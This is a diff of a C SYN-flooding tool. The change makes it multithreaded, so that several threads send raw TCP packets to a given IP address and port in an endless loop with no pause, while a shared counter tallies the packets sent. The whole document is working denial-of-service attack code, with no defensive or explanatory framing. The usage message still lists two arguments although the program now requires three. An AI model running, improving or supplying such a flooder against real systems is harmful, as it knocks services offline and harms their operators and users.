@@ -4,6 +4,7 @@
 #include<stdlib.h>
 #include<netinet/in.h>
 #include<arpa/inet.h>
+#include<pthread.h>
 #include<unistd.h>
 
 #include "header.h"
@@ -15,24 +16,65 @@
 #define PACKET_LENGTH 4096
 #define TIME_PAUSE 10
 
+
 int create_socket();
+void *spamming_thread(void *arg);
 unsigned short checksum(unsigned short *ptr,int nbytes);
 int config_headers(struct iphdr *iph, struct tcphdr *tcph, struct pseudo_tcp_header *psh_ptr, char *data);
 
+pthread_mutex_t myMutex = PTHREAD_MUTEX_INITIALIZER;
+
 char *dest_ip;
 int dest_port;
+int spam_count = 0;
 
 
 int main(int argc, char *argv[]) {
 
-	if (argc < 3) {
+	if (argc < 4) {
 		printf("ERROR : ARGUMENTS MISSING ( ./syn_flooding [IP_ADDR] [PORT] )\n");
 		return 1;
 	};
 
 	dest_ip = argv[1];
 	dest_port = atoi(argv[2]);
+	int nb_threads = atoi(argv[3]);
 
+
+	//Destination identity
+	struct sockaddr_in dest;
+	memset(&dest, 0, sizeof(dest));
+	dest.sin_family = AF_INET;
+	dest.sin_port = htons(dest_port);
+	inet_pton(AF_INET, dest_ip, &(dest.sin_addr));
+
+
+	pthread_t threads_non_pointer[nb_threads];
+	pthread_t *threads = threads_non_pointer;
+
+	//Threads creation
+	for (int i = 0 ; i < nb_threads; i++) {
+		if ( pthread_create( threads + i, NULL, spamming_thread, &dest) != 0 ) {
+			printf( "ERROR IN THREAD CREATION");
+			return 1;
+		}
+	};
+
+
+	//Threads joins to ensure they finish before main
+	for (int i = 0 ; i < nb_threads; i++ ) {
+		if ( pthread_join( threads[i], NULL ) != 0 ) {
+			printf( "PROBLEM WAITING THREAD");
+			return 1;
+		};
+	};
+
+	return 0;
+
+}
+
+
+void *spamming_thread(void *arg) {
 	int sockfd = create_socket();
 
 	char packet[PACKET_LENGTH], *data;
@@ -50,24 +92,18 @@ int main(int argc, char *argv[]) {
 	strncpy(data, data_string, strlen(data_string));
 
 
-	//Destination identity
-	struct sockaddr_in dest;
-	memset(&dest, 0, sizeof(dest));
-	dest.sin_family = AF_INET;
-	dest.sin_port = htons(dest_port);
-	inet_pton(AF_INET, dest_ip, &(dest.sin_addr));
-
-	int spam_count = 0;
 
 	while (1) {
+		pthread_mutex_lock(&myMutex);
 		printf("SPAM COUNTER : %d\n", spam_count++);
+		pthread_mutex_unlock(&myMutex);
 
 		//Add value to the structures attributes and calculate checksums
 		config_headers(iph, tcph, &psh, data);
 
 		//Send the packet
 		if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1){
-            printf("ERROR : SENDING PACKET\n");
+			printf("ERROR : SENDING PACKET\n");
 		};
 
 		//usleep(TIME_PAUSE);
@@ -75,7 +111,6 @@ int main(int argc, char *argv[]) {
 		memset(packet, 0, PACKET_LENGTH);
 	};
 
-	return 0;
 
 }
 
@@ -151,6 +186,7 @@ int config_headers(struct iphdr *iph, struct tcphdr *tcph, struct pseudo_tcp_hea
 
 	return 0;
 };
+
 
 unsigned short checksum(unsigned short *ptr,int nbytes)
 {
